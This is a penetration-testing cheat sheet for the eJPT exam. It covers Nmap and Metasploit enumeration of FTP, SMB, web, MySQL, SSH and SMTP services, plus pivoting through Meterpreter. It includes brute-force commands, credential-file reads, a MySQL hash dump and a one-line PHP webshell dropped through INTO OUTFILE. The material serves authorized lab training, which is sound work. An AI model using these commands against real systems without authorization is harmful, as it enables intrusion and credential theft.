## 1. What is Enumeration?

Enumeration comes **after** host discovery and port scanning. The goal is to extract **detailed, actionable information** from services running on target systems.

**What we look for:**
- Account names / usernames
- Network shares
- Service versions
- Misconfigured services
- Banners and OS information

> ⚠️ Unlike passive recon, **enumeration involves active connections** to remote devices — you are touching the target.

**Services commonly targeted:**
- FTP (21), SSH (22), SMTP (25), HTTP (80/443), SMB (139/445), MySQL (3306)

### 💡 Tips
- Enumeration is everything — if you can't find a way in, you probably haven't enumerated deep enough
- **Take notes constantly** — every IP, open port, username, password, and service version you find. You WILL need it later
- Services can run on **non-standard ports** — always scan beyond the top 1000

---

## 2. Penetration Testing Methodology

```
Information Gathering → Enumeration → Exploitation → Post-Exploitation → Reporting
```

| Phase | Sub-tasks |
|---|---|
| **Info Gathering** | OSINT, Network Mapping, Host Discovery, Port Scanning, Service/OS Detection |
| **Enumeration** | Service Enumeration, User Enumeration, Share Enumeration |
| **Exploitation** | Vuln Analysis, Developing/Modifying Exploits, Service Exploitation |
| **Post-Exploitation** | Local Enum, Priv Esc, Credential Access, Persistence, Lateral Movement |
| **Reporting** | Report Writing, Recommendations |

### 💡 Tips
- Enumeration feeds directly into exploitation — the more thorough your enumeration, the easier exploitation becomes
- Don't skip phases. Always confirm a host is alive before scanning, and always enumerate before exploiting
- Check `/etc/hosts` at the start — target hostnames may already be listed there

---

## 3. Port Scanning & Enumeration with Nmap

### What is Nmap?
Free, open-source network scanner. Used to discover hosts, identify open ports, detect service versions and OS, and run scripts via NSE.

---

### Host Discovery
```bash
nmap -sn 10.10.10.0/24                      # Ping sweep — no port scan
fping -a -g 10.10.10.0/24 2>/dev/null       # Alternative host discovery
```

### Basic Scanning
```bash
nmap <TARGET_IP>                             # Default (top 1000 ports)
nmap -sV -sC <TARGET_IP>                    # Version + default scripts ← best for eJPT
nmap -A <TARGET_IP>                         # Aggressive: OS, version, scripts, traceroute
nmap -p- <TARGET_IP>                        # All 65535 ports
nmap -p 1-10000 <TARGET_IP>                 # Ports 1-10000
nmap -sU -sV <TARGET_IP>                    # UDP scan
nmap -Pn <TARGET_IP>                        # Skip host check, force scan
```

### Recommended Scan for eJPT
```bash
nmap -T4 -sC -sV -p 1-10000 <TARGET_IP> -oX scan_results.xml
```

---

### Output Formats
```bash
nmap -sV -oX output.xml <TARGET_IP>         # XML — use this to import into MSF
nmap -sV -oN output.txt <TARGET_IP>         # Normal text
nmap -sV -oA output <TARGET_IP>             # All formats at once
```

---

### Nmap Scan Types

| Flag | Type | Notes |
|---|---|---|
| `-sS` | SYN Stealth | Doesn't complete 3-way handshake — stealthy, needs root |
| `-sT` | TCP Connect | Full connection, used when no root access |
| `-sU` | UDP | Scans UDP ports |
| `-sn` | Ping Sweep | No port scan, just host discovery |
| `-Pn` | No Ping | Skip host check, force port scan |

---

### Timing Templates

| Flag | Speed | Use When |
|---|---|---|
| `-T1` | Sneaky | Avoiding IDS |
| `-T3` | Normal | Default |
| `-T4` | Aggressive | **Use this in eJPT labs** |
| `-T5` | Insane | Very fast, may miss results |

---

### Nmap Scripting Engine (NSE)

All scripts are at: `/usr/share/nmap/scripts/`

```bash
# List scripts for a service
ls /usr/share/nmap/scripts/ | grep "ftp"
ls /usr/share/nmap/scripts/ | grep "smb"

# Run a specific script
nmap --script <script-name> <TARGET_IP>

# Run all scripts for a service
nmap --script=ftp-* <TARGET_IP>
nmap --script=smb-* <TARGET_IP>

# Vulnerability scripts
nmap -p <port> --script=vuln <TARGET_IP>
```

---

### Version Detection Intensity
```bash
nmap -sV --version-intensity 8 <TARGET_IP>
# 0 = lightest | 9 = heaviest/most accurate
```

---

### Firewall Indicators in Nmap Output
- **`tcpwrapped`** — TCP handshake completed but remote host closed connection. Firewall likely blocking.
- **`RST` packet received** — Something (firewall) prevented the connection.
- Service detected but **version missing** — Firewall may be filtering probes.

### 💡 Tips
- Always save output as XML (`-oX`) so you can import it into Metasploit later
- Use `-Pn` if hosts aren't responding to pings — firewalls often block ICMP
- `-sS` requires root/sudo. In eJPT labs you usually have root, so prefer `-sS` over `-sT`
- Run `db_nmap` inside msfconsole to scan and auto-populate the database at the same time
- If a host shows `filtered` on all ports, try scanning with `-Pn` and `-sT`

---

## 4. Importing Nmap Scan Results into MSF

### Step-by-step
```bash
# 1. Start PostgreSQL and Metasploit
service postgresql start && msfconsole -q

# 2. Check DB is connected
db_status

# 3. Create a workspace (keeps things organized)
workspace -a target_enum

# 4. Run Nmap scan and save as XML
nmap -Pn -sV -O <TARGET_IP> -oX scan.xml

# 5. Import into msfconsole
db_import scan.xml

# 6. View imported results
hosts           # All discovered hosts
services        # All discovered services
vulns           # Any vulnerabilities detected
creds           # Credentials found

# 7. Or scan directly inside MSF
db_nmap -Pn -sV -O <TARGET_IP>
```

### 💡 Tips
- Use `setg RHOSTS <IP>` to set the target globally — saves you re-typing it for every module
- Use `workspace -a <name>` to separate different targets cleanly
- `services` inside msfconsole gives a quick summary of all open ports at a glance
- `hosts -R` automatically sets RHOSTS to all discovered hosts

---

## 5. Port Scanning with Auxiliary Modules

### What are Auxiliary Modules?
Used for: scanning, discovery, fuzzing, enumeration, brute-forcing. Can scan TCP & UDP. Useful before exploitation and also **after gaining a foothold** (pivoting to internal networks).

### Starting MSF
```bash
service postgresql start && msfconsole -q
db_status
workspace -a <name>
setg RHOSTS <TARGET_IP>
```

### TCP Port Scan
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET_IP>
set PORTS 1-10000
run
```

### UDP Sweep
```bash
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS <TARGET_IP>
run
```

### Lab Infrastructure (Pivoting Context)
The typical eJPT lab setup:
1. **You** → **Target 1** (directly accessible)
2. Exploit Target 1 → get Meterpreter shell
3. Use Target 1 as a pivot to reach **Target 2** (on internal subnet)
4. Use auxiliary TCP scanner through the pivot to enumerate Target 2

### 💡 Tips
- Auxiliary modules save massive time compared to manual tool commands
- After exploiting Target 1, **always check** `ipconfig` / `ifconfig` for additional network interfaces — that's your hint for a second subnet
- `setg RHOSTS` applies the IP globally across all modules so you only set it once per session
- Use `run -j` to run modules as background jobs, letting you keep working

---

## 6. FTP Enumeration

### Key Facts
- Protocol: **File Transfer Protocol**
- Default Port: **TCP 21**
- Used for file transfers between client/server; also used to manage web server files
- Authentication: username + password
- **Anonymous login is a very common misconfiguration** — always test this first

---

### Nmap FTP Scripts
```bash
# Check for anonymous login
nmap --script ftp-anon -p 21 <TARGET_IP>

# Comprehensive scan
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 <TARGET_IP>

# Brute force FTP login
nmap --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt -p 21 <TARGET_IP>

# Run ALL FTP scripts
nmap --script=ftp-* -p 21 <TARGET_IP>

# Banner grab
nc -nv <TARGET_IP> 21
```

### Metasploit FTP Modules
```bash
use auxiliary/scanner/ftp/ftp_version       # Get FTP banner + version
use auxiliary/scanner/ftp/anonymous         # Test anonymous login
use auxiliary/scanner/ftp/ftp_login         # Brute force login
```

### Manual FTP Login
```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (blank or any@email.com)

# Inside FTP
ls -la
get <filename>         # Download a file
put <filename>         # Upload a file (check write permissions!)
cd ../../              # Navigate up
binary                 # Switch to binary mode for file transfers
```

### 💡 Tips
- **Always try anonymous login first** — `ftp <IP>` then username `anonymous`, blank password
- If you get anonymous access, check all directories including hidden ones (`ls -la`)
- Files in FTP shares sometimes contain credentials, SSH keys, or config files — always `get` and read them
- If FTP allows uploads AND the FTP root is the web server root, you can upload a webshell
- Check if vsftpd 2.3.4 is running — it has a famous backdoor exploit (`exploit/unix/ftp/vsftpd_234_backdoor`)
- Banner grab always: `nc -nv <IP> 21` — version info helps with searchsploit

---

## 7. SMB Enumeration

### Key Facts
- **Server Message Block** — network file sharing protocol for LAN
- Default Port: **TCP 445** (modern SMB direct)
- Old SMB ran over NetBIOS: **TCP 139**
- **SAMBA** = Linux implementation of SMB (allows Windows to access Linux shares)
- Enumerate: version, shares, users, groups, domain info, password policies

---

### Nmap SMB Scripts
```bash
# Full SMB enumeration
nmap --script smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups -p 445 <TARGET_IP>

# SMB vulnerability scan
nmap -p 445 --script=smb-vuln-* <TARGET_IP>

# Check for EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>

# Enum shares with credentials
nmap -p 445 --script smb-enum-shares,smb-ls \
  --script-args smbusername=administrator,smbpassword=<PASSWORD> <TARGET_IP>
```

### Metasploit SMB Modules
```bash
use auxiliary/scanner/smb/smb_version       # Detect SMB version (SMBv1/v2)
use auxiliary/scanner/smb/smb_enumusers     # Enumerate users
use auxiliary/scanner/smb/smb_enumshares    # Enumerate shares
use auxiliary/scanner/smb/smb_login         # Brute force login
```

### smbclient (Manual)
```bash
# List shares — no credentials
smbclient -L //<TARGET_IP>/
smbclient -L //<TARGET_IP>/ -N              # No password prompt

# Connect to a specific share
smbclient //<TARGET_IP>/<SHARE_NAME>
smbclient //<TARGET_IP>/<SHARE_NAME> -U <USERNAME>

# Inside smbclient
ls
get <filename>
put <filename>
```

### smbmap
```bash
smbmap -H <TARGET_IP>                                                    # Anonymous enum
smbmap -u administrator -p <PASSWORD> -H <TARGET_IP>                    # Auth enum
smbmap -H <TARGET_IP> -u administrator -p <PASSWORD> -r 'C$'            # Browse share
smbmap -H <TARGET_IP> -u administrator -p <PASSWORD> --download 'C$\flag.txt'
smbmap -H <TARGET_IP> -u administrator -p <PASSWORD> -x 'ipconfig'      # Run command
```

### enum4linux
```bash
enum4linux -a <TARGET_IP>                   # Full enumeration
enum4linux -U <TARGET_IP>                   # Users only
enum4linux -S <TARGET_IP>                   # Shares only
enum4linux -P <TARGET_IP>                   # Password policy
```

### 💡 Tips
- **Always start with `smb_version`** — the version tells you what exploits are available (EternalBlue only works on SMBv1)
- Then run `smb_enumshares` and `smb_enumusers` before any brute force
- **Always try null session (no credentials)** — many lab machines allow anonymous SMB access
- Files inside shares often contain plaintext passwords or config files — always download and read them
- If you find `SMBv1` enabled, immediately check for **MS17-010 (EternalBlue)** — one of the most common eJPT exploits
- `enum4linux -a` is the most comprehensive single SMB command — run it on every SMB host
- Credential reuse is very common — if you find a password anywhere, try it on SMB, SSH, FTP, and MySQL

---

## 8. Web Server Enumeration

### Key Facts
- Web servers serve website data via **HTTP/HTTPS**
- HTTP → **TCP 80** | HTTPS → **TCP 443**
- Also check: **TCP 8080**, **8443**, **8000** (common alternate ports)
- Popular web servers: Apache, Nginx, Microsoft IIS
- Enumerate: version, HTTP headers, directories, files, allowed methods, CMS info

---

### Nmap HTTP Scripts
```bash
# Enumerate directories and interesting files
nmap --script http-enum -p 80 <TARGET_IP>

# Get HTTP response headers
nmap --script http-headers -p 80 <TARGET_IP>

# Check allowed HTTP methods
nmap --script http-methods --script-args http-methods.url-path=/ -p 80 <TARGET_IP>

# WebDAV scan
nmap --script http-webdav-scan -p 80 <TARGET_IP>

# All HTTP scripts
nmap --script=http-* -p 80 <TARGET_IP>
```

### Metasploit HTTP Modules
```bash
use auxiliary/scanner/http/apache_userdir_enum   # Apache user enumeration
use auxiliary/scanner/http/brute_dirs            # Directory brute force
use auxiliary/scanner/http/dir_scanner           # Directory scanning
use auxiliary/scanner/http/http_put              # Test if PUT method is allowed
use auxiliary/scanner/http/files_dir             # Find files and directories
use auxiliary/scanner/http/robots_txt            # Parse robots.txt
```

### Directory Brute Force
```bash
# Gobuster (fast)
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Dirb
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt

# Dirsearch
dirsearch -u http://<TARGET_IP>/ -t 50
```

### Manual Web Recon
```bash
# Curl for headers
curl -I http://<TARGET_IP>
curl http://<TARGET_IP>

# Banner grab with netcat
nc -nv <TARGET_IP> 80
GET / HTTP/1.0
(press Enter twice)
```

### Common Paths to Always Check
```
/robots.txt
/admin
/login
/dashboard
/phpmyadmin
/wp-admin           (WordPress)
/wp-login.php       (WordPress)
/.git               (Exposed git repo)
/backup
/config
/.htaccess
```

### 💡 Tips
- **Always check `/robots.txt` first** — it often reveals hidden directories intentionally blocked from crawlers
- Check HTTP headers for server version info (`Server:` header) — useful for searchsploit
- If PUT method is allowed, you can potentially upload a webshell
- If you find WordPress, run `wpscan --url http://<IP>` for a full CMS audit
- `http-enum` NSE script is very fast and finds a lot — run it before doing manual brute force
- If you find a login page, try default credentials: `admin:admin`, `admin:password`, `root:root`
- **View page source** (Ctrl+U) — look for comments, hidden inputs, and hardcoded credentials

---

## 9. MySQL Enumeration

### Key Facts
- Open-source **relational database** (SQL-based)
- Default Port: **TCP 3306**
- Commonly stores web app data (users, passwords, content)
- Enumerate: version, databases, tables, users, password hashes

---

### Nmap MySQL Scripts
```bash
# Check for empty/blank password
nmap --script mysql-empty-password -p 3306 <TARGET_IP>

# Enumerate databases (with credentials)
nmap --script mysql-databases --script-args mysqluser=root,mysqlpass="" -p 3306 <TARGET_IP>

# Dump user hashes (requires credentials)
nmap --script mysql-dump-hashes --script-args username=root,password=<PW> -p 3306 <TARGET_IP>

# Run all MySQL scripts
nmap --script=mysql-* -p 3306 <TARGET_IP>
```

### Metasploit MySQL Modules
```bash
use auxiliary/scanner/mysql/mysql_version       # Get MySQL version
use auxiliary/scanner/mysql/mysql_login         # Brute force login
use auxiliary/scanner/mysql/mysql_schemadump    # Dump database schema
use auxiliary/admin/mysql/mysql_sql             # Execute SQL queries directly
use auxiliary/scanner/mysql/mysql_writable_dirs # Check for writable directories
```

### Manual MySQL Access
```bash
# Connect with no password
mysql -h <TARGET_IP> -u root

# Connect with password
mysql -h <TARGET_IP> -u root -p

# Inside MySQL
show databases;
use <DATABASE_NAME>;
show tables;
select * from users;
select user, password from mysql.user;         # Dump all user hashes
select load_file('/etc/passwd');               # Read system files (if FILE privilege)
```

### 💡 Tips
- **Always try `mysql -h <IP> -u root` with no password** — blank root password is a very common misconfiguration
- If you get in, first run `select user, password from mysql.user;` — those hashes can be cracked offline with hashcat
- Look for non-standard databases (not `information_schema`, `mysql`, `performance_schema`) — that's where the juicy stuff is
- If MySQL has `FILE` privilege, read sensitive files: `select load_file('/etc/passwd');`
- If MySQL has write access to the web root, drop a PHP shell: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';`
- Use `mysql_schemadump` in MSF to quickly get a full schema without manually querying

---

## 10. SSH Enumeration

### Key Facts
- **Secure Shell** — encrypted remote administration protocol
- Successor to Telnet (Telnet is unencrypted — everything in plaintext!)
- Default Port: **TCP 22** — but can be moved to any port
- Can enumerate: version, supported algorithms, valid usernames, auth methods

---

### Nmap SSH Scripts
```bash
# Check supported authentication methods for a user
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 <TARGET_IP>

# Enumerate supported algorithms
nmap --script ssh2-enum-algos -p 22 <TARGET_IP>

# Get SSH host key
nmap --script ssh-hostkey --script-args ssh_hostkey=full -p 22 <TARGET_IP>

# Run all SSH scripts
nmap --script=ssh-* -p 22 <TARGET_IP>
```

### Metasploit SSH Modules
```bash
use auxiliary/scanner/ssh/ssh_version       # Get SSH banner + version
use auxiliary/scanner/ssh/ssh_login         # Brute force login
use auxiliary/scanner/ssh/ssh_enumusers     # Enumerate valid usernames (timing attack)
```

### SSH Brute Force with Hydra
```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<TARGET_IP>
```

### Manual SSH
```bash
ssh <username>@<TARGET_IP>
ssh <username>@<TARGET_IP> -p <PORT>
ssh -i id_rsa <username>@<TARGET_IP>       # With private key
```

### Post-SSH Local Enumeration (After getting shell)
```bash
whoami && id
cat /etc/passwd
cat /etc/shadow                              # Only if root
uname -a                                     # Kernel version
hostname
netstat -antp                                # Active connections (hint for pivoting!)
ifconfig / ip a                              # Network interfaces — check for extra subnets!
ps aux                                       # Running processes
env                                          # Environment variables (may contain passwords)
find / -perm -u=s -type f 2>/dev/null        # SUID files (for privilege escalation)
```

### 💡 Tips
- SSH version from the banner is useful — older versions have known vulnerabilities, check searchsploit
- **After brute-forcing SSH credentials, SSH in and immediately do local enumeration**
- `ssh_enumusers` uses a timing attack to find valid usernames — run this before brute forcing to narrow down the list
- If you find an `id_rsa` or `.pem` file anywhere (FTP share, SMB share, web dir), try it as an SSH key
- After SSH login, **run `ifconfig` or `ip a` immediately** — extra network interfaces = pivot opportunity
- Limit Hydra threads on SSH (`-t 4`) to avoid locking out accounts or crashing the service
- Credentials found on FTP/SMB often work on SSH too — always try credential reuse

---

## 11. SMTP Enumeration

### Key Facts
- **Simple Mail Transfer Protocol** — used for sending email
- Default Port: **TCP 25**
- Also runs on: TCP **465** (SMTPS) and TCP **587** (submission)
- Key commands: **VRFY** (verify user exists), **EXPN** (expand mailing list)
- Can enumerate: version and **valid system usernames**

---

### Nmap SMTP Scripts
```bash
# Enumerate valid users via VRFY/EXPN/RCPT
nmap --script smtp-enum-users -p 25 <TARGET_IP>
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 <TARGET_IP>

# Run all SMTP scripts
nmap --script=smtp-* -p 25 <TARGET_IP>

# Banner grab
nc -nv <TARGET_IP> 25
```

### Metasploit SMTP Modules
```bash
use auxiliary/scanner/smtp/smtp_version       # Get SMTP version/banner
use auxiliary/scanner/smtp/smtp_enum          # Enumerate valid users
```

### Manual SMTP User Enumeration
```bash
nc -nv <TARGET_IP> 25

# VRFY command
# 250 = user exists | 550 = user doesn't exist
VRFY root
VRFY admin
VRFY www-data
VRFY nobody

# EXPN command (expands a mailing list/alias)
EXPN admin
EXPN root
```

### 💡 Tips
- SMTP user enumeration gives you **real system usernames** — use them for SSH/FTP brute forcing afterwards
- Always check the **SMTP banner first** — it reveals the mail server software and version
- Try common Linux usernames: `root`, `admin`, `www-data`, `mail`, `nobody`, `daemon`
- SMTP is often overlooked but regularly appears in eJPT labs — don't skip it
- `smtp_enum` in MSF has a built-in username wordlist, so it works even without providing your own

---

## 12. Pivoting Cheatsheet

> 🚨 Pivoting is one of the hardest parts of eJPT — practice this separately before your exam.

### Scenario
```
You → [Target 1 - public] → [Target 2 - internal subnet only]
```
You exploit Target 1, then use it as a bridge to reach Target 2 on the internal network.

---

### Step 1 — Get Meterpreter on Target 1
```bash
sessions -l
sessions -i 1
```

### Step 2 — Identify Internal Network
```bash
# Inside Meterpreter
ipconfig          # Windows
ifconfig          # Linux
arp -a            # ARP table — reveals other live hosts without scanning
route             # Routing table
```

### Step 3 — Add Route Through Session
```bash
run autoroute -s <INTERNAL_SUBNET>      # e.g. 192.168.2.0/24
run autoroute -p                        # Verify routes
background
```

### Step 4 — Scan Target 2 Through the Tunnel
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET2_IP>
set PORTS 1-1000
run
```

### Step 5 — Port Forwarding (for tools outside MSF)
```bash
sessions -i 1
portfwd add -l 1234 -p 80 -r <TARGET2_IP>
# Now localhost:1234 → Target2:80
background

db_nmap -sS -sV -p 1234 localhost
curl http://localhost:1234
```

### Step 6 — Exploit Target 2
```bash
use exploit/<relevant_exploit>
set payload windows/meterpreter/bind_tcp     # Use bind_tcp when pivoting!
set RHOSTS <TARGET2_IP>
set LPORT <PORT>
run
```

> ⚠️ Use `bind_tcp` payload when pivoting — `reverse_tcp` won't work properly through a pivot because the connection can't route back directly to your machine.

### Adding Routes Manually (Linux)
```bash
ip route add <NETWORK> via <GATEWAY> dev <INTERFACE>
ip route                 # View routes (Linux)
route print              # View routes (Windows)
```

### 💡 Tips
- **After getting a shell on any machine, always run `ipconfig`/`ifconfig` first** — extra network interfaces = pivot opportunity
- `arp -a` inside the compromised machine reveals other live hosts on the internal network without noisy scanning
- `run autoroute -s <subnet>` inside Meterpreter is the fastest way to set up routing
- If `reverse_tcp` isn't connecting through a pivot, switch to `bind_tcp`
- Practice pivoting in the INE labs before your exam — the eJPT almost always has a pivot scenario

---

## 13. Exam Start Checklist

Use this at the very beginning of your eJPT exam:

```
[ ] 1. Check /etc/hosts on Kali for any pre-configured target hostnames
[ ] 2. Ping sweep to find all live hosts:  nmap -sn <SUBNET>/24
[ ] 3. Full Nmap on each live host:  nmap -T4 -sC -sV -p 1-10000 <IP> -oX output.xml
[ ] 4. Start MSF + PostgreSQL:  service postgresql start && msfconsole -q
[ ] 5. Import scan:  db_import output.xml  — then check:  hosts  &&  services
[ ] 6. Note all open ports and service versions
[ ] 7. Try anonymous / no-password login on: FTP, SMB, MySQL
[ ] 8. Run enum4linux on any SMB target:  enum4linux -a <IP>
[ ] 9. Brute force login services with Hydra if needed
[ ] 10. Check web server for interesting directories (robots.txt, gobuster)
[ ] 11. After any shell — run ipconfig/ifconfig to check for extra subnets (pivot hint!)
[ ] 12. Try credential reuse — passwords found anywhere should be tried on all services
[ ] 13. Answer questions as you go — don't wait till the end
```

### General Exam Reminders
- The exam is **48 hours** — take breaks, sleep, eat. Burnout will kill your performance.
- **Answer questions in any order** — you don't need to follow a sequence.
- **Move on if stuck** — don't spend hours on one machine. Come back later.
- **Don't guess IPs** — confirm everything with scans.
- **Credential reuse is very common** — every password you find should be tried on every other service.

---

## 14. Quick Reference Tables

### Common Ports

| Port | Protocol | Service |
|---|---|---|
| 21 | TCP | FTP |
| 22 | TCP | SSH |
| 23 | TCP | Telnet (unencrypted) |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 |
| 139 | TCP | NetBIOS / SMB (legacy) |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB |
| 465 | TCP | SMTPS |
| 587 | TCP | SMTP (submission) |
| 3306 | TCP | MySQL |
| 3389 | TCP | RDP |
| 8080 | TCP | HTTP Alternate |
| 8443 | TCP | HTTPS Alternate |

---

### Wordlists to Know

```bash
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/metasploit/unix_users.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

### MSF Module Quick Reference

```bash
# Scanning
auxiliary/scanner/portscan/tcp
auxiliary/scanner/discovery/udp_sweep

# FTP
auxiliary/scanner/ftp/ftp_version
auxiliary/scanner/ftp/anonymous
auxiliary/scanner/ftp/ftp_login

# SMB
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_enumusers
auxiliary/scanner/smb/smb_enumshares
auxiliary/scanner/smb/smb_login

# SSH
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/ssh/ssh_login
auxiliary/scanner/ssh/ssh_enumusers

# HTTP
auxiliary/scanner/http/apache_userdir_enum
auxiliary/scanner/http/brute_dirs
auxiliary/scanner/http/dir_scanner
auxiliary/scanner/http/http_put
auxiliary/scanner/http/robots_txt

# MySQL
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_login
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/admin/mysql/mysql_sql

# SMTP
auxiliary/scanner/smtp/smtp_version
auxiliary/scanner/smtp/smtp_enum
```